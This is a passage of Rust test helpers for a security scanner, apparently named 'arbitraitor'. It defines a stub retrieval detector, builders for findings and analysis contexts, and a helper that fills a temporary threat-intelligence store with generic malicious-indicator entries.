    impl Detector for RetrievalDetector {
        fn metadata(&self) -> DetectorMetadata {
            test_metadata("retrieval.detector")
        }

        fn analyze(&self, ctx: &AnalysisContext<'_>) -> Vec<Finding> {
            if ctx.retrieval.is_some() {
                vec![test_finding(
                    "retrieval.detector",
                    ctx,
                    "retrieval metadata observed",
                )]
            } else {
                Vec::new()
            }
        }
    }

    fn test_metadata(id: &str) -> DetectorMetadata {
        DetectorMetadata {
            id: id.to_owned(),
            version: "test".to_owned(),
            supported_artifact_kinds: vec![ArtifactKind::GenericText],
            capabilities: Vec::new(),
            is_local: true,
            may_upload: false,
            default_timeout_ms: 100,
            is_deterministic: true,
        }
    }

    fn test_finding(detector: &str, ctx: &AnalysisContext<'_>, title: &str) -> Finding {
        Finding {
            id: format!("{detector}.finding"),
            detector: detector.to_owned(),
            category: FindingCategory::SuspiciousScriptBehavior,
            severity: Severity::Low,
            confidence: Confidence::High,
            title: title.to_owned(),
            description: "test finding".to_owned(),
            evidence: Vec::<Evidence>::new(),
            artifact_sha256: ctx.artifact_sha256.clone(),
            location: None,
            remediation: None,
            references: Vec::new(),
            tags: Vec::new(),
        }
    }

    fn test_context<'artifact>(
        artifact_bytes: &'artifact [u8],
        retrieval: Option<RetrievalInfo>,
    ) -> AnalysisContext<'artifact> {
        AnalysisContext {
            artifact_bytes,
            classification: arbitraitor_artifact::classify(artifact_bytes),
            retrieval,
            artifact_sha256: digest(artifact_bytes),
        }
    }

    fn store_with_entries(
        name: &str,
        entries: impl IntoIterator<Item = FeedEntry>,
    ) -> Result<IntelStore, Box<dyn std::error::Error>> {
        let path = temp_store_path(name);
        let mut store = IntelStore::open(&path)?;
        for entry in entries {
            store.add_entry(entry)?;
        }
        let _ = fs::remove_file(path);
        Ok(store)
    }

    fn temp_store_path(name: &str) -> PathBuf {
        let unique = format!(
            "arbitraitor-analysis-{name}-{}-{}.json",
            std::process::id(),
            SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map_or(0, |duration| duration.as_nanos())
        );
        std::env::temp_dir().join(unique)
    }

    fn entry(
        indicator_type: IndicatorType,
        value: &str,
        source_class: FeedSourceClass,
    ) -> FeedEntry {
        let indicator = Indicator {
            indicator_type,
            value: value.to_owned(),
        };
        FeedEntry {
            schema_version: CURRENT_SCHEMA_VERSION,
            id: format!("entry:{indicator_type:?}:{value}"),
            indicator,
            classification: Classification::Malicious,
            severity: Severity::High,
            confidence: Confidence::Confirmed,
            disposition: Disposition::Block,
            source_class,
            first_seen: "2026-06-01T00:00:00Z".to_owned(),
            last_seen: "2026-06-17T00:00:00Z".to_owned(),
            expires_at: None,
            sources: vec![FeedSource {
                source_type: "test".to_owned(),
                reference: "analysis-test".to_owned(),
            }],
            evidence: FeedEvidence {
                malware_family: None,
                notes: None,
            },
            review: ReviewStatus {
                status: ReviewState::Reviewed,
                reviewers: vec!["test".to_owned()],
            },
        }
    }
}
